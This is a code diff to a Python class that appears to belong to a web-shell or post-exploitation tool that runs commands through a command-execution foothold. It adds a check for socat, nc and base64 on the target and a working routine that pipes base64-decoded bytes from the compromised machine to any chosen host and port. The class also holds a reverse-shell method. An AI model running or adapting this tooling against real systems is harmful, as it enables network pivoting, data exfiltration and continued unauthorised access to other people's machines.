@@ -575,6 +575,20 @@ class LinuxCmdOneLiner:
     async def open_reverse_shell(self, host: str, port: int) -> None:
         await self.submit(reverse_shell_payload(host, port))
 
+    async def get_send_tcp_support_methods(self) -> t.List[str]:
+        """得到发送字节支持的TCP方法"""
+        result = await self.submit(
+            "command -v socat >/dev/null 2>&1 && echo HAS_SOCAT; "
+            "command -v nc >/dev/null 2>&1 && echo HAS_NC; "
+            "command -v base64 >/dev/null 2>&1 && echo HAS_BASE64"
+        )
+        methods: t.List[str] = []
+        if "HAS_SOCAT" in result and "HAS_BASE64" in result:
+            methods.append("socat")
+        if "HAS_NC" in result and "HAS_BASE64" in result:
+            methods.append("nc")
+        return methods
+
     async def send_bytes_over_tcp(
         self,
         host: str,
@@ -583,13 +597,40 @@ class LinuxCmdOneLiner:
         send_method: t.Union[str, None] = None,
     ) -> t.Union[bytes, None]:
         """把一串字节通过TCP发送到其他机器上，可以指定对应的发送方法"""
-        raise exceptions.ServerError(
-            "不支持此功能，你不会想用命令执行传HTTP吧？"
-        )  # 可以是可以，用nc或者bash可以做，但是暂时不实现这个功能
+        content_b64 = base64.b64encode(content).decode()
+        host_q = shlex.quote(host)
+        port_str = str(port)
 
-    async def get_send_tcp_support_methods(self) -> t.List[str]:
-        """得到发送字节支持的TCP方法"""
-        return []
+        if send_method is not None:
+            methods_to_try = [send_method]
+        else:
+            methods_to_try = await self.get_send_tcp_support_methods()
+            if not methods_to_try:
+                raise exceptions.ServerError(
+                    "无法发送TCP数据：目标系统没有可用的工具（需要socat或nc及base64）"
+                )
+
+        for method in methods_to_try:
+            if method == "socat":
+                cmd = (
+                    f"echo {content_b64} | base64 -d"
+                    f" | socat - TCP:{host_q}:{port_str},connect-timeout=5"
+                    f" | base64 -w0"
+                )
+            elif method == "nc":
+                cmd = (
+                    f"echo {content_b64} | base64 -d"
+                    f" | nc -w 5 {host_q} {port_str}"
+                    f" | base64 -w0"
+                )
+            else:
+                raise exceptions.UserError(f"未知的TCP发送方法: {method}")
+
+            result = await self.submit(cmd)
+            if result.strip():
+                return base64.b64decode(result.strip())
+
+        return None
 
     async def send_http_request(
         self,
